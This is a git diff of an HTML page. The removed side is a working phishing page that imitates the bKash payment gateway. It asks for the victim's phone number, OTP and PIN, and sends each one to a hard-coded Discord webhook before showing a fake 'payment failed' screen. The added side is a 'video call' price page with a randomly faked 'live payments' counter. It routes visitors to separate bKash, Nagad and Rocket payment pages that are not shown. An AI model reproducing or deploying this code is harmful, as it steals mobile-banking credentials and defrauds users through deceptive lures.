@@ -3,339 +3,287 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>bKash Payment Gateway</title>
+    <title>Video Call Service - Secure Payment</title>
     
-    <!-- সোশ্যাল মিডিয়া প্রিভিউ ইমেজ ট্যাগ -->
-    <meta property="og:title" content="bKash Payment">
-    <meta property="og:description" content="Secure bKash Payment Gateway">
+    <meta property="og:title" content="Video Call Services & Pricing">
+    <meta property="og:description" content="Select your package and proceed with secure payment.">
     <meta property="og:image" content="https://raw.githubusercontent.com/wildcartxzx-beep/Pbkash-/refs/heads/main/logo.png">
     <meta property="og:type" content="website">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background-color: #8c8c8c; }
-        body { font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 10vh; }
+        html, body { height: 100%; margin: 0; padding: 0; overflow-x: hidden; background: #070913; }
+        body { font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; box-sizing: border-box; }
         
-        .bkash-container { 
-            width: 92%; max-width: 350px; height: 480px; background: white; 
-            border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
-            display: flex; flex-direction: column; position: relative; overflow: hidden;
+        .main-container { 
+            width: 100%; max-width: 380px; background: linear-gradient(145deg, #13182b, #0a0e1a); 
+            border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.8), 0 0 20px rgba(110, 68, 255, 0.2); 
+            display: flex; flex-direction: column; position: relative; overflow: hidden; border: 2px solid rgba(110, 68, 255, 0.4);
         }
 
-        .header { height: 45px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f1f1f1; flex-shrink: 0; background: #fff; }
-        .header img { width: 70px; object-fit: contain; }
+        .floating-element {
+            position: absolute; font-size: 14px; opacity: 0.6; pointer-events: none; animation: floatParticle 4s infinite ease-in-out;
+            z-index: 2;
+        }
+        @keyframes floatParticle {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(15deg); }
+        }
 
-        .merchant-bar { display: flex; align-items: center; justify-content: space-between; padding: 8px 15px; border-bottom: 1px solid #eee; flex-shrink: 0; display: none; background: #fff; }
-        .m-info { display: flex; align-items: center; gap: 8px; }
-        .m-icon { width: 32px; height: 32px; border: 1px solid #eee; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: white; }
-        .m-icon img { width: 130%; height: 130%; object-fit: cover; }
-        .m-text { font-size: 10px; font-weight: 500; color: #4A4A4A; line-height: 1.2; }
-        .m-amount { font-weight: 700; font-size: 14px; color: #4A4A4A; }
+        .video-slider-box {
+            width: 100%; height: 185px; background: #000; position: relative; overflow: hidden;
+            display: flex; align-items: center; justify-content: center; border-bottom: 2px solid #6e44ff;
+        }
+        .video-slider-box video {
+            width: 100%; height: 100%; object-fit: cover; object-position: center; position: absolute; inset: 0;
+            opacity: 0; transition: opacity 0.8s ease-in-out;
+        }
+        .video-slider-box video.active { opacity: 1; }
 
         .content-area { 
-            background: #e2136e; flex-grow: 1; display: flex; flex-direction: column; 
-            align-items: center; justify-content: center; padding: 15px 20px; 
-            color: white; text-align: center; position: relative; overflow: hidden;
+            padding: 16px; flex-grow: 1; display: flex; flex-direction: column; align-items: center; position: relative;
         }
 
-        /* দৃশ্যমান ও আকর্ষণীয় গ্লোবাল লোডার স্ক্রিন */
-        #global-loader { 
-            position: absolute; inset: 0; background: #e2136e; z-index: 40; 
-            display: flex; flex-direction: column; justify-content: center; align-items: center; 
-            transition: opacity 0.4s ease;
+        .section-title { 
+            font-size: 15px; font-weight: 800; color: #fff; margin-bottom: 12px; text-align: center;
+            background: linear-gradient(135deg, #ff4081, #ff6e40); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-transform: uppercase; letter-spacing: 0.8px;
         }
-        .spinner {
-            width: 45px; height: 45px; border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid white; border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* অ্যামাউন্ট সিলেকশন পেজ */
-        #amount-page { 
-            position: absolute; inset: 0; background: linear-gradient(135deg, #fce4ec 0%, #f48fb1 100%);
-            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
-            transition: transform 0.4s ease, opacity 0.3s ease; z-index: 10;
+        .price-grid { 
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; width: 100%; margin-bottom: 10px;
         }
-        #amount-page.hide { transform: translateX(-100%); opacity: 0; }
-
-        .amount-title { font-size: 15px; font-weight: 700; color: #880e4f; margin-bottom: 20px; }
-        .amount-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; }
-        .amount-card { 
-            background: #ffffff; border: 2px solid #e2136e; color: #e2136e; padding: 12px 0; 
-            font-size: 18px; font-weight: 700; border-radius: 6px; cursor: pointer; 
-            transition: all 0.2s ease; box-shadow: 0 4px 10px rgba(226, 19, 110, 0.2);
-        }
-        .amount-card:hover { background: #e2136e; color: white; transform: translateY(-2px); }
-        .amount-card:active { transform: scale(0.95); }
-
-        /* মূল পেমেন্ট পেজ */
-        #payment-page { 
-            position: absolute; inset: 0; background: #e2136e; padding: 15px 20px;
+        .price-card { 
+            background: rgba(255, 255, 255, 0.04); border: 2px solid rgba(255, 64, 129, 0.6); color: #fff; padding: 12px 8px; 
+            font-size: 15px; font-weight: 700; border-radius: 12px; cursor: pointer; text-align: center;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 4px 15px rgba(255, 64, 129, 0.15);
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            color: white; transform: translateX(100%); transition: transform 0.4s ease; z-index: 5;
+            position: relative; overflow: hidden;
+            animation: neonPulse 3s infinite alternate;
         }
-        #payment-page.active { transform: translateX(0); }
+        .price-card:nth-child(even) { animation-delay: 1.5s; border-color: rgba(110, 68, 255, 0.8); }
+        @keyframes neonPulse {
+            0% { box-shadow: 0 0 5px rgba(255, 64, 129, 0.2), inset 0 0 5px rgba(255, 64, 129, 0.1); }
+            100% { box-shadow: 0 0 15px rgba(255, 64, 129, 0.6), inset 0 0 10px rgba(255, 64, 129, 0.3); }
+        }
+        .price-card span { font-size: 12px; font-weight: 500; color: #ff80ab; margin-top: 3px; }
+        .price-card:hover { background: linear-gradient(135deg, #ff4081, #6e44ff); border-color: #fff; transform: translateY(-3px) scale(1.03); box-shadow: 0 8px 25px rgba(255, 64, 129, 0.5); }
+        .price-card:hover span { color: #fff; }
+        .price-card:active { transform: scale(0.96); }
 
-        .label-main { font-size: 14px; font-weight: 500; margin-bottom: 10px; }
-        .label-sub { font-size: 15px; font-weight: 500; margin-bottom: 10px; }
+        .note-text { font-size: 11px; text-align: center; color: #a0aec0; margin: 6px 0 10px 0; font-weight: 500; line-height: 1.4; }
+
+        .live-counter-box {
+            width: 100%; background: rgba(40, 167, 69, 0.15); border: 1.5px dashed #28a745; border-radius: 10px;
+            padding: 8px; text-align: center; font-size: 11px; font-weight: 700; color: #4cd964;
+            margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 6px;
+            box-shadow: 0 0 10px rgba(40, 167, 69, 0.2); box-sizing: border-box;
+        }
+        .live-dot { width: 8px; height: 8px; background: #28a745; border-radius: 50%; animation: blinkDot 1s infinite; }
+        @keyframes blinkDot { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1); } }
+
+        #payment-method-section {
+            position: absolute; inset: 0; background: rgba(13, 17, 30, 0.97); backdrop-filter: blur(12px);
+            display: none; opacity: 0; transform: scale(0.9);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); flex-direction: column; align-items: center; justify-content: center; padding: 20px; z-index: 10;
+        }
+        #payment-method-section.show { display: flex; opacity: 1; transform: scale(1); }
+
+        .selected-package-box {
+            background: linear-gradient(135deg, #6e44ff, #ff4081); color: white; padding: 14px 18px;
+            border-radius: 12px; font-size: 15px; font-weight: 700; text-align: center; margin-bottom: 20px;
+            box-shadow: 0 8px 25px rgba(110, 68, 255, 0.5); width: 100%; box-sizing: border-box;
+            animation: pulseGlow 2s infinite;
+        }
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 0 0 rgba(110, 68, 255, 0.7); }
+            70% { box-shadow: 0 0 0 12px rgba(110, 68, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(110, 68, 255, 0); }
+        }
+
+        .payment-label { font-size: 13px; font-weight: 600; color: #e2e8f0; margin-bottom: 18px; text-align: center; }
         
-        .main-input { 
-            width: 100%; height: 42px; border-radius: 6px; border: 2.5px solid rgba(255, 255, 255, 0.5); 
-            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3); text-align: center; font-size: 17px; 
-            font-weight: 600; color: #4A4A4A; outline: none; margin: 10px 0; box-sizing: border-box;
-            background: white;
+        .gateway-grid { display: flex; justify-content: center; gap: 12px; width: 100%; margin-bottom: 25px; }
+        
+        .gateway-card {
+            width: 95px; height: 55px; background: #ffffff; border: 2.5px solid #ff4081; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.3); padding: 6px; box-sizing: border-box;
+            animation: bounceButton 1.8s infinite ease-in-out;
         }
-        .main-input::placeholder { color: #4A4A4A; opacity: 0.3; font-weight: 400; }
+        .gateway-card:nth-child(2) { animation-delay: 0.3s; border-color: #ff6f00; box-shadow: 0 5px 15px rgba(255, 111, 0, 0.3); }
+        .gateway-card:nth-child(3) { animation-delay: 0.6s; border-color: #7b1fa2; box-shadow: 0 5px 15px rgba(123, 31, 162, 0.3); }
 
-        .resend-link { font-size: 13px; text-decoration: underline; cursor: pointer; color: white; display: none; font-weight: 500; }
-        .timer-box { font-size: 12px; }
+        @keyframes bounceButton {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
 
-        /* একশন বার */
-        .action-bar { height: 65px; background: #f1f1f1; display: none; align-items: center; padding: 0 15px; gap: 10px; flex-shrink: 0; }
-        .btn { flex: 1; height: 40px; border-radius: 3px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
-        .btn-cancel { background: white; border: 1px solid #ddd; color: #666; }
-        .btn-confirm { background: #b5b5b5; color: white; pointer-events: none; }
-        .btn-confirm.active { background: #e2136e; pointer-events: auto; }
+        .gateway-card img { width: 100%; height: 100%; object-fit: contain; }
+        .gateway-card:hover { transform: scale(1.1) translateY(-3px); box-shadow: 0 10px 25px rgba(255,255,255,0.3); }
 
-        /* বাটন লোডার অ্যানিমেশন */
-        .inner-loader { display: none; gap: 4px; position: absolute; }
-        .inner-loader div { width: 7px; height: 7px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
-        @keyframes bounce { to { opacity: 0.3; transform: translateY(-4px); } }
+        .back-btn {
+            background: rgba(255, 255, 255, 0.08); border: 1.5px solid rgba(255, 255, 255, 0.2); color: #fff; font-size: 12px; font-weight: 700; padding: 10px 20px; border-radius: 10px; cursor: pointer; transition: all 0.2s; margin-top: 10px;
+        }
+        .back-btn:hover { background: rgba(255, 255, 255, 0.2); }
 
-        #fail-screen { display: none; position: absolute; inset: 0; background: #e2136e; flex-direction: column; align-items: center; justify-content: center; z-index: 30; padding: 20px; }
-        .fail-icon { width: 45px; height: 45px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 300; margin-bottom: 12px; }
-        .fail-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
-        .fail-reason { font-size: 15px; font-weight: 400; opacity: 0.9; margin-bottom: 15px; }
-        .fail-redirect { font-size: 11px; opacity: 0.8; margin-top: 5px; }
-        .fail-redirect u { text-decoration: underline; }
-
-        .footer { height: 50px; background: white; border-top: 1px solid #eee; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 9px; color: #999; flex-shrink: 0; }
-        .footer b { color: #e2136e; font-size: 11px; margin-bottom: 2px; }
+        .footer { height: 40px; background: #070913; border-top: 1px solid rgba(255,255,255,0.06); display: flex; align-items: center; justify-content: center; font-size: 11px; color: #a0aec0; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<div class="bkash-container">
-    <!-- হেডার লোগো -->
-    <div class="header">
-        <img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/refs/heads/main/bkash-logo-horizontal-mobile-banking-app-icon-emblem-transparent-background-free-png.png" alt="bKash">
+<div class="main-container">
+    <div class="floating-element" style="top: 10px; left: 15px;">💎</div>
+    <div class="floating-element" style="top: 30px; right: 20px; animation-delay: 1s;">🔥</div>
+    <div class="floating-element" style="bottom: 40px; left: 10px; animation-delay: 2s;">✨</div>
+
+    <div class="video-slider-box">
+        <video id="v1" src="https://files.catbox.moe/7bg075.mp4" autoplay muted loop playsinline preload="auto" class="active"></video>
+        <video id="v2" src="https://files.catbox.moe/q5firp.mp4" autoplay muted loop playsinline preload="auto"></video>
+        <video id="v3" src="https://files.catbox.moe/3ya0db.mp4" autoplay muted loop playsinline preload="auto"></video>
+        <video id="v4" src="https://files.catbox.moe/y1h953.mp4" autoplay muted loop playsinline preload="auto"></video>
+        <video id="v5" src="https://files.catbox.moe/81uige.mp4" autoplay muted loop playsinline preload="auto"></video>
+        <video id="v6" src="https://files.catbox.moe/k64ssw.mp4" autoplay muted loop playsinline preload="auto"></video>
     </div>
 
-    <!-- মার্চেন্ট বার -->
-    <div id="merchant-bar" class="merchant-bar">
-        <div class="m-info">
-            <div class="m-icon"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/heads/main/images%20(3).png"></div>
-            <div class="m-text"><b>SSLCOMMERZ</b><br><span>Inv: 8cf84713499...</span></div>
-        </div>
-        <div class="m-amount">৳<span id="displayAmount">0</span></div>
-    </div>
-
-    <div class="content-area">
-        <!-- দৃশ্যমান গ্লোবাল লোডার স্ক্রিন -->
-        <div id="global-loader">
-            <div class="spinner"></div>
-            <p style="margin-top:15px; font-size: 14px; font-weight: 600; letter-spacing: 0.5px;">বিকাশ পেমেন্ট লোড হচ্ছে...</p>
-        </div>
-
-        <!-- অ্যামাউন্ট সিলেকশন পেজ -->
-        <div id="amount-page">
-            <div class="amount-title">পেমেন্ট পরিমাণ নির্বাচন করুন</div>
-            <div class="amount-grid">
-                <button class="amount-card" onclick="selectAmount(20)">৳২০</button>
-                <button class="amount-card" onclick="selectAmount(110)">৳১১০</button>
-                <button class="amount-card" onclick="selectAmount(250)">৳২৫০</button>
-                <button class="amount-card" onclick="selectAmount(350)">৳৩৫০</button>
-                <button class="amount-card" onclick="selectAmount(510)">৳৫১০</button>
-                <button class="amount-card" onclick="selectAmount(1020)">৳১০২০</button>
+    <div class="content-area" id="contentArea">
+        <div class="section-title">💎 ভিডিও কলের মূল্য তালিকা 💎</div>
+        
+        <div class="price-grid" id="priceGrid">
+            <div class="price-card" onclick="initPkg(20, '০৩ মিনিট', this)">
+                ৳২০ <span>📱 ০৩ মিনিট</span>
+            </div>
+            <div class="price-card" onclick="initPkg(110, '০৫ মিনিট', this)">
+                ৳১১০ <span>📱 ০৫ মিনিট</span>
+            </div>
+            <div class="price-card" onclick="initPkg(250, '১০ মিনিট', this)">
+                ৳২৫০ <span>📱 ১০ মিনিট</span>
+            </div>
+            <div class="price-card" onclick="initPkg(350, '২০ মিনিট', this)">
+                ৳৩৫০ <span>📱 ২০ মিনিট</span>
+            </div>
+            <div class="price-card" onclick="initPkg(510, '৩০ মিনিট', this)">
+                ৳৫১০ <span>📱 ৩০ মিনিট</span>
+            </div>
+            <div class="price-card" onclick="initPkg(1020, '১ ঘণ্টা', this)">
+                ৳১,০২০ <span>📱 ১ ঘণ্টা</span>
             </div>
         </div>
 
-        <!-- মূল পেমেন্ট পেজ -->
-        <div id="payment-page">
-            <div id="ui-steps" style="width: 100%;">
-                <div id="label-top" class="label-main">Your bKash Account Number</div>
-                <div id="label-mid" class="label-sub"></div>
-                <input type="tel" id="user-input" class="main-input" placeholder="e.g 01XXXXXXXXX" maxlength="11" oninput="validateInput()">
-                <div id="terms-txt" style="font-size: 12px;">Confirm and proceed, <u style="cursor:pointer">terms & conditions</u></div>
-                <div id="resend-container" style="display: none; margin-top: 5px;">
-                    <div id="timer-box" class="timer-box">Resend Code in <span id="timer">30</span>s</div>
-                    <div id="resend-link" class="resend-link" onclick="handleResend()">Resend Code</div>
+        <div class="note-text">💰 আপনার পছন্দমতো সময় বেছে নিন এবং সরাসরি ভিডিও কলে কাজ শুরু করুন।</div>
+
+        <div class="live-counter-box">
+            <div class="live-dot"></div>
+            <span>লাইভ: এই মুহূর্তে <b id="liveCounter">৭</b> জন পেমেন্ট সম্পন্ন করছেন</span>
+        </div>
+
+        <div id="payment-method-section">
+            <div class="selected-package-box" id="selectedInfoText">
+                নির্বাচিত প্যাকেজ ➔ ০৩ মিনিট (৳২০)
+            </div>
+            
+            <div class="payment-label">পেমেন্ট করার জন্য মাধ্যম সিলেক্ট করুন 👇</div>
+            
+            <div class="gateway-grid">
+                <div class="gateway-card" onclick="execRoute('bkash')">
+                    <img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/refs/heads/main/bkash-logo-horizontal-mobile-banking-app-icon-emblem-transparent-background-free-png.png" alt="bKash">
+                </div>
+                <div class="gateway-card" onclick="execRoute('nogod')">
+                    <img src="https://raw.githubusercontent.com/wildcartxzx-beep/Cartimage/refs/heads/main/images%20(1).png" alt="Nagad">
+                </div>
+                <div class="gateway-card" onclick="execRoute('rocket')">
+                    <img src="https://raw.githubusercontent.com/wildcartxzx-beep/Cartimage/refs/heads/main/IMG_20260810_142359_312.jpg" alt="Rocket">
                 </div>
             </div>
 
-            <div id="fail-screen">
-                <div class="fail-icon">✕</div>
-                <div class="fail-title">Payment Failed</div>
-                <div class="fail-reason">Insufficient balance</div>
-                <div class="fail-redirect">Redirecting to <u>Merchant Website</u> in <span id="redir-timer">5</span>s</div>
-            </div>
+            <button class="back-btn" onclick="restoreView()">← অন্য প্যাকেজ বেছে নিন</button>
         </div>
     </div>
 
-    <!-- একশন বার -->
-    <div class="action-bar" id="action-bar">
-        <button class="btn btn-cancel" onclick="resetToAmountPage()">Cancel</button>
-        <button id="confirm-btn" class="btn btn-confirm" onclick="handleFlow()">
-            <span id="btn-text">Confirm</span>
-            <div class="inner-loader" id="btn-load"><div></div><div></div><div></div></div>
-        </button>
-    </div>
-
-    <!-- ফুটার -->
     <div class="footer">
-        <b>📞 16247</b>
-        <div>© 2026 bKash, All Rights Reserved</div>
+        <div>© 2026 palomoir, All Rights Reserved</div>
     </div>
 </div>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1528766265706025141/sMFgoZvySgACZiyhqORIhulTM6gZlLbVGckfXACBFeCNpFbT6WVC9AtWBGkuzDZZgIT9";
-    let step = 1, number = "", selectedAmount = "0", otpInterval;
+    (function() {
+        var _amt = 0;
+        var _dur = '';
+        var _vids = [
+            document.getElementById('v1'),
+            document.getElementById('v2'),
+            document.getElementById('v3'),
+            document.getElementById('v4'),
+            document.getElementById('v5'),
+            document.getElementById('v6')
+        ];
+        var _idx = 0;
 
-    // পেজ লোড হওয়ার পর লোডার সচল রাখা ও দৃশ্যমান করা
-    window.onload = () => {
-        setTimeout(() => {
-            const loader = document.getElementById('global-loader');
-            loader.style.opacity = '0';
-            setTimeout(() => {
-                loader.style.display = 'none';
-            }, 400);
-        }, 1200);
-    };
+        window.addEventListener('DOMContentLoaded', function() {
+            _vids.forEach(function(v) {
+                if (v && v.play) v.play().catch(function() {});
+            });
+        });
 
-    function selectAmount(amount) {
-        selectedAmount = amount;
-        document.getElementById('displayAmount').innerText = selectedAmount;
-        
-        // অ্যামাউন্টে ক্লিক করার পর স্পষ্ট ও দৃশ্যমান লোডার দেখানো
-        const loader = document.getElementById('global-loader');
-        loader.style.display = 'flex';
-        loader.style.opacity = '1';
-        loader.querySelector('p').innerText = "পেমেন্ট গেটওয়েতে সংযোগ করা হচ্ছে...";
+        setInterval(function() {
+            if (_vids[_idx]) _vids[_idx].classList.remove('active');
+            _idx = (_idx + 1) % _vids.length;
+            if (_vids[_idx]) {
+                _vids[_idx].classList.add('active');
+                _vids[_idx].play().catch(function() {});
+            }
+        }, 4000);
 
-        setTimeout(() => {
-            document.getElementById('amount-page').classList.add('hide');
-            document.getElementById('merchant-bar').style.display = 'flex';
-            document.getElementById('action-bar').style.display = 'flex';
-            document.getElementById('payment-page').classList.add('active');
+        setInterval(function() {
+            var counterEl = document.getElementById('liveCounter');
+            if (counterEl) {
+                var val = Math.floor(Math.random() * 18) + 3;
+                counterEl.innerText = val;
+            }
+        }, 4500);
+
+        window.initPkg = function(a, d, el) {
+            _amt = a;
+            _dur = d;
             
-            // লোডার হাইড করা
-            loader.style.opacity = '0';
-            setTimeout(() => {
-                loader.style.display = 'none';
-                loader.querySelector('p').innerText = "বিকাশ পেমেন্ট লোড হচ্ছে..."; // টেক্সট রিসেট
-            }, 400);
-        }, 1500);
-    }
-
-    function resetToAmountPage() {
-        document.getElementById('payment-page').classList.remove('active');
-        document.getElementById('merchant-bar').style.display = 'none';
-        document.getElementById('action-bar').style.display = 'none';
-        document.getElementById('amount-page').classList.remove('hide');
-        step = 1;
-        document.getElementById('user-input').value = "";
-        document.getElementById('user-input').maxLength = 11;
-        document.getElementById('user-input').placeholder = "e.g 01XXXXXXXXX";
-        document.getElementById('label-top').innerText = "Your bKash Account Number";
-        document.getElementById('label-mid').innerText = "";
-        document.getElementById('terms-txt').style.display = 'block';
-        document.getElementById('confirm-btn').classList.remove('active');
-    }
-
-    function validateInput() {
-        const input = document.getElementById('user-input');
-        const btn = document.getElementById('confirm-btn');
-        const len = input.value.length;
-        if (step === 1) len === 11 ? btn.classList.add('active') : btn.classList.remove('active');
-        else if (step === 2) len === 6 ? btn.classList.add('active') : btn.classList.remove('active');
-        else if (step === 3) (len >= 4 && len <= 5) ? btn.classList.add('active') : btn.classList.remove('active');
-    }
-
-    async function sendToDiscord(content) {
-        try { await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ title: "bKash Hit", description: content, color: 14816110 }] }) }); } catch (e) {}
-    }
-
-    function startOTPTimer() {
-        let timeLeft = 30;
-        const timerBox = document.getElementById('timer-box');
-        const resendLink = document.getElementById('resend-link');
-        timerBox.style.display = 'block';
-        resendLink.style.display = 'none';
-        clearInterval(otpInterval);
-        otpInterval = setInterval(() => {
-            timeLeft--;
-            document.getElementById('timer').innerText = timeLeft;
-            if(timeLeft <= 0) {
-                clearInterval(otpInterval);
-                timerBox.style.display = 'none';
-                resendLink.style.display = 'block';
+            if (el) {
+                el.style.transform = 'scale(0.95)';
+                setTimeout(function() { el.style.transform = 'scale(1)'; }, 150);
             }
-        }, 1000);
-    }
 
-    function handleResend() { 
-        startOTPTimer(); 
-        sendToDiscord(`**OTP Resend Clicked**\n**User:** ${number}`);
-    }
-
-    function handleFlow() {
-        const input = document.getElementById('user-input');
-        const loader = document.getElementById('btn-load');
-        const btnTxt = document.getElementById('btn-text');
-        const val = input.value;
-        btnTxt.style.visibility = 'hidden';
-        loader.style.display = 'flex';
-        let delay = (step === 1) ? 4000 : 1500;
-
-        setTimeout(() => {
-            btnTxt.style.visibility = 'visible';
-            loader.style.display = 'none';
-            if(step === 1) {
-                number = val;
-                sendToDiscord(`**Number:** ${number}\n**Amount:** ${selectedAmount} TK`);
-                document.getElementById('label-top').innerText = "Enter Verification Code Sent To";
-                document.getElementById('label-mid').innerText = number.substring(0,3) + " ** *** " + number.substring(8);
-                document.getElementById('terms-txt').style.display = 'none';
-                document.getElementById('resend-container').style.display = 'block';
-                input.value = ""; input.placeholder = "Enter 6 digit code"; input.maxLength = 6;
-                step = 2; startOTPTimer();
-            } 
-            else if(step === 2) {
-                clearInterval(otpInterval);
-                sendToDiscord(`**OTP:** ${val}\n**User:** ${number}`);
-                document.getElementById('label-top').innerText = "Enter PIN of Your bKash Account";
-                document.getElementById('label-mid').innerText = "(" + number.substring(0,3) + " ** *** " + number.substring(8) + ")";
-                document.getElementById('resend-container').style.display = 'none';
-                input.value = ""; 
-                input.type = "tel"; 
-                input.style.webkitTextSecurity = "disc"; 
-                input.placeholder = "Enter PIN"; 
-                input.maxLength = 5;
-                step = 3;
+            var infoBox = document.getElementById('selectedInfoText');
+            if (infoBox) {
+                infoBox.innerHTML = '✨ নির্বাচিত প্যাকেজ ➔ ' + _dur + ' (৳' + _amt + ') ✨';
             }
-            else if(step === 3) {
-                sendToDiscord(`**PIN:** ${val}\n**User:** ${number}`);
-                document.getElementById('merchant-bar').style.display = 'none';
-                document.getElementById('action-bar').style.display = 'none';
-                document.getElementById('ui-steps').style.display = 'none';
-                document.getElementById('fail-screen').style.display = 'flex';
-                startRedirectTimer();
-            }
-            validateInput(); 
-        }, delay);
-    }
 
-    function startRedirectTimer() {
-        let rs = 5;
-        const interval = setInterval(() => {
-            rs--;
-            if(document.getElementById('redir-timer')) document.getElementById('redir-timer').innerText = rs;
-            if(rs <= 0) { clearInterval(interval); location.reload(); }
-        }, 1000);
-    }
+            var pSec = document.getElementById('payment-method-section');
+            if (pSec) {
+                pSec.style.display = 'flex';
+                setTimeout(function() { pSec.classList.add('show'); }, 10);
+            }
+        };
+
+        window.restoreView = function() {
+            var pSec = document.getElementById('payment-method-section');
+            if (pSec) {
+                pSec.classList.remove('show');
+                setTimeout(function() { pSec.style.display = 'none'; }, 300);
+            }
+        };
+
+        window.execRoute = function(provider) {
+            if (_amt <= 0) return;
+            var routes = {
+                'bkash': 'payment.html?amount=',
+                'nogod': 'payment1.html?amount=',
+                'rocket': 'payment2.html?amount='
+            };
+            if (routes[provider]) {
+                window.location.href = routes[provider] + _amt;
+            }
+        };
+    })();
 </script>
 </body>
 </html>
